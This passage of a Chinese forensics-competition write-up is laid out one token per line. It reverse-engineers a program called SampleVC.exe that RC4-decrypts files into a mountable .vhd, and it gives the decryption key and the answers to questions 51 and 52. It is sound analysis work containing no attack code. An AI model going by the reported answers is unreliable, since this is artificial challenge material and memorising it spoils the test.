+AES
+.
+new
+(
+key
+,
+AES
+.
+MODE_ECB
+)
+decrypted
+=
+cipher
+.
+decrypt
+(
+ciphertext
+)
+password
+=
+bytes
+([
+decrypted
+[
+i
+]
+^
+(
+3
+*
+i
++
+0x7F
+)
+for
+i
+in
+range
+(
+16
+)])
+51 利用
+SampleVC.exe
+解密 U 盘中被加密的文件, 解密后的文件后缀是什么?
+¶
+答案
+.vhd
+接上题. 继续跟进
+sub_140001CF0
+.
+C
+if
+(
+!
+a1
+||
+!
+a2
+)
+return
+0xFFFFFFFFLL
+;
+Stream
+=
+0
+;
+v43
+=
+0
+;
+if
+(
+wfopen_s
+(
+&
+Stream
+,
+a1
+,
+L
+"rb"
+)
+||
+!
+Stream
+)
+return
+4294967294L
+L
+;
+wcscpy_s
+(
+Destination
+,
+0x104u
+,
+a1
+);
+wcscat_s
+(
+Destination
+,
+0x104u
+,
+L
+".vhd"
+);
+if
+(
+wfopen_s
+(
+&
+v43
+,
+Destination
+,
+L
+"wb"
+)
+||
+!
+v43
+)
+{
+fclose
+(
+Stream
+);
+return
+4294967293L
+L
+;
+}
+可以看到在文件名(
+a1
+)后添加了
+.vhd
+. 接下来的一段包含
+_mm_add_epi32
+函数的代码在填充 S-BOX.
+52 找到被加密的交易记录, 统计李安弘虚拟币收款地址钱包总收款金额
+¶
+答案
+186948.09
+编写脚本 RC4 解密
+¶
+接上题的分析. 接着 KSA 使用密钥 a2 对 S-box 进行置换:
+C
+v17
+=
+0
+;
+// j
+v18
+=
+v46
+;
+// S-box指针
+v19
+=
+0
+;
+// i
+do
+{
+v20
+=
+(
+unsigned
+__int8
+)
+*
+v18
+;
+v17
+=
+(
+v20
++
+*
+(
+unsigned
+__int8
+*
+)((
+v19
+&
+0xF
+)
++
+a2
+)
++
+v17
+)
+%
+256
+;
+v21
+=
+&
+v46
+[
+v17
+];
+*
+v18
+=
+*
+v21
+;
+*
+v21
+=
+v20
+;
+++
+v19
+;
+++
+v18
+;
+--
+v7
+;
+}
+while
+(
+v7
+);
+接着用 RC4 算法处理文件:
+C
+while
+(
+(
+i
+=
+fread
+(
+Buffer
+,
+1u
+,
+0x1000u
+,
+Stream
+))
+)
+{
+for
+(
+j
+=
+0
+;
+j
+<
+i
+;
+++
+j
+)
+{
+// RC4 PRGA算法
+v26
+=
+(
+v22
++
+1
+)
+%
+256
+;
+// i
+v49
+=
+(
+v23
++
+(
+unsigned
+__int8
+)
+v46
+[
+v26
+])
+%
+256
+;
+// j
+// 交换S-box[i]和S-box[j]
+v28
+=
+*
+v27
+;
+*
+v27
+=
+v46
+[
+v49
+];
+v46
+[
+v49
+]
+=
+v28
+;
+// 生成密钥字节并异或
+v52
+[
+j
+]
+=
+Buffer
+[
+j
+]
+^
+v46
+[(
+unsigned
+__int8
+)(
+v46
+[
+v48
+]
++
+v46
+[
+v49
+])];
+}
+fwrite
+(
+v52
+,
+1u
+,
+i
+,
+v43
+);
+// 写入输出文件
+}
+因此只需要使用密钥
+PleaseRunAsAdmin
+对
+vc
+文件进行 RC4 即可解密:
+通过
+SampleVC.exe
+解密
+¶
+使用管理员权限尝试运行
+SampleVC.exe
+之后, 发现提示"挂载成功", 但是解密后的文件会立刻被删除.
+比较方便的办法是, 在火绒的自定义规则中添加一条对程序运行目录的规则, 禁止
+SampleVC.exe
+对该目录的删除操作:
+挂载解密后的 vhd 文件, 其中有一个 Excel 文件
+usdt_transaction_ledger_70_records.xlsx
+.
+筛选所有收入记录, 求和:
